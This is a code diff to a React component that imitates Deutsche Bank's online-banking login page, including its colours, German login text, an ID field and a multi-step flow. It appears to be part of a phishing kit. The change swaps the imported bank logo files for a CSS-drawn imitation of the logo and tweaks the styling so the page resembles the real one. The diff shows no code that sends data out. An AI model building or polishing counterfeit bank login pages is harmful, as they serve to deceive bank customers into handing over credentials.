@@ -5,8 +5,6 @@ import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import { Info, AlertTriangle, Monitor, Lock, Eye, EyeOff, ArrowLeft } from "lucide-react";
 import bgAsset from "@/assets/deutsche-bank-bg.jpg.asset.json";
-import logoAsset from "@/assets/deutsche-bank-logo.svg.asset.json";
-import teaserAsset from "@/assets/deutsche-bank-teaser.jpg.asset.json";
 
 const BLUE = "#0018a8";
 const RED = "#c1002b";
@@ -25,7 +23,7 @@ const DeutscheBank = () => {
   useEffect(() => {
     window.scrollTo(0, 0);
   }, []);
-  usePageMeta("Deutsche Bank – Online-Banking", logoAsset.url);
+  usePageMeta("Deutsche Bank – Online-Banking");
 
   const handleContinue = () => {
     if (dbId.trim().length === 0) return;
@@ -78,13 +76,13 @@ const DeutscheBank = () => {
                 <div className="pt-0.5">
                   <div
                     className="w-5 h-5 rounded-full flex items-center justify-center"
-                    style={{ backgroundColor: BLUE }}
+                    style={{ backgroundColor: "#1a3a4a" }}
                   >
                     <Info size={14} color="#fff" />
                   </div>
                 </div>
                 <div className="space-y-2">
-                  <div className="font-bold text-[15px]">Login mit Ihrer Deutsche Bank ID</div>
+                  <div className="text-[15px]">Login mit Ihrer Deutsche Bank ID</div>
                   <p>
                     Sie können sich im Online-Banking der Deutschen Bank nur noch mit Ihrer Deutsche
                     Bank ID anmelden. Der bisherige Link „Mit Filiale, Konto und PIN einloggen" ist
@@ -104,7 +102,21 @@ const DeutscheBank = () => {
 
               {/* Login card */}
               <div className="bg-white p-6 lg:p-8 shadow-sm">
-                <img src={logoAsset.url} alt="Deutsche Bank" className="h-5 mb-6" />
+                <div className="flex items-center gap-2 mb-6" style={{ color: "#111" }}>
+                  <span className="text-[18px] font-semibold">Deutsche Bank</span>
+                  <span
+                    className="inline-block"
+                    style={{
+                      width: 16,
+                      height: 16,
+                      border: `2px solid ${BLUE}`,
+                    }}
+                  >
+                    <span className="block w-full h-full" style={{
+                      background: `linear-gradient(to bottom right, transparent 45%, ${BLUE} 45%, ${BLUE} 55%, transparent 55%)`,
+                    }} />
+                  </span>
+                </div>
 
                 {step === 2 && (
                   <button
